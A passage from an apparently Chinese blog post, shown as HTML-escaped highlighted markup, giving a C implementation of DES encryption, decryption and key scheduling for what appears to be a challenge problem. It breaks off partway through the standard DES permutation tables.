        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S_Box[i][Y][X];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
            DatOut[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v9 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
            v9 &lt;span style=&#34;color:#f92672&#34;&gt;/=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;   
        }         
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;F_Change&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; DatKi[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; MiR[&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    TablePermute(MiR,DatIn,E_Table,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;);
    Xor(MiR,DatKi,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;);
    S_Change(DatIn,MiR);
    TablePermute(DatIn,DatIn,P_Table,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SetKey&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; KeyIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; KeyBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;KiL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;KeyBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;KiR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;KeyBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;];
    ByteToBit(KeyBit, KeyIn, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    TablePermute(KeyBit, KeyBit, PC1_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        LoopMove(KiL, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, Move_Table[i]);
        LoopMove(KiR, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, Move_Table[i]);
        TablePermute(SubKey[i], KeyBit, PC2_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;); 
    }        
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PlayDes&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Temp[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;MiL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;MiR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
    ByteToBit(MesBit, MesIn, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    TablePermute(MesBit, MesBit, IP_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, MesBit[i]);
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        BitsCopy(Temp, MiR, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
        F_Change(MiR, SubKey[i]);
        Xor(MiR, MiL, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
        BitsCopy(MiL, Temp, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, MesBit[j]);
        }
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MesBit[i];
        MesBit[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MesBit[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
        MesBit[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
    }
    TablePermute(MesBit, MesBit, IPR_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, MesBit[i]);
    }
    BitToHex(MesOut,MesBit,&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KickDes&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesOut[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;],&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; MesIn[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Temp[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;MiL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;MiR &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;MesBit[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
    HexToBit(MesBit, MesIn, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    TablePermute(MesBit, MesBit, IP_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MesBit[i];
        MesBit[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MesBit[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
        MesBit[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
        BitsCopy(Temp, MiL, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
        F_Change(MiL, SubKey[i]);
        Xor(MiL, MiR, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
        BitsCopy(MiR, Temp, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
    }    
    TablePermute(MesBit, MesBit, IPR_Table, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, MesBit[i]);
    }
    BitToByte(MesOut, MesBit, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;);        
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;bool.h，我的评价是不如直接上 c++&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef __BOOL_H__
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define __BOOL_H__
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;enum&lt;/span&gt;
  {
    false &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
    true  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;tables.h，之前找到的文件有几处与题目中不同，不知道是作者写错了还是题目改数了，直接把算好的 subkey 填到这里，就不用再输入密钥算了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef _TABLES_H_
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define _TABLES_H_  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; IP_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{             
	&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; 
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; IPR_Table[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{              
	&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;,
	&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;,
